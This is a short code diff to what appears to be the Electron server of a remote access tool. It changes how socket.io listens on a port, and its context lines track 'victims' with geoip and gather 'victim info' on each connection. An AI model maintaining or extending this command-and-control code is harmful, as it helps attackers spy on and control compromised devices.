@@ -1,6 +1,7 @@
 const { app, BrowserWindow } = require('electron')
 const electron = require('electron');
 const { ipcMain } = require('electron');
+const http = require('http');
 var io = require('socket.io');
 var geoip = require('geoip-lite');
 var victimsList = require('./app/assets/js/model/Victim');
@@ -129,7 +130,9 @@ app.on('activate', () => {
 // It will be fired when AppCtrl emit this event
 ipcMain.on('SocketIO:Listen', function (event, port) {
 
-  IO = io.listen(port);
+  const server = http.createServer();
+  IO = io(server);
+  server.listen(port);
   IO.sockets.pingInterval = 10000;
   IO.sockets.on('connection', function (socket) {
     // Get victim info
